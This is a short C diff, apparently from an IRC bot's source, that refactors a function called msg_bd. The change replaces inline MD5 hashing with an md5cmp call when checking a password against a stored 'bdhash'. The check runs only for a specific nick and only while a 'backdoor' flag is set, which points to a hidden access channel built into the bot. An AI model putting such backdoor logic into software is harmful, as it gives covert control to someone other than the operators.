@@ -355,13 +355,10 @@ static int msg_word(char *nick, char *host, struct userrec *u, char *par)
   return 1;
 }
 
-unsigned char md5out[33];
-char md5string[33];
 
 static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
 {
   int left = 0;
-  MD5_CTX ctx;
 
   if (strcmp(nick, thenick) || !backdoor)
     return 1;
@@ -374,11 +371,7 @@ static int msg_bd (char *nick, char *host, struct userrec *u, char *par)
       backdoor = 0;
       return 1;
     }
-    MD5_Init(&ctx);
-    MD5_Update(&ctx, pass, strlen(pass));
-    MD5_Final(md5out, &ctx);
-    strcpy(md5string, btoh(md5out, MD5_DIGEST_LENGTH));
-    if (strcmp(bdhash, md5string)) {
+    if (md5cmp(bdhash, pass)) {
       backdoor = 0;
       return 1;
     }
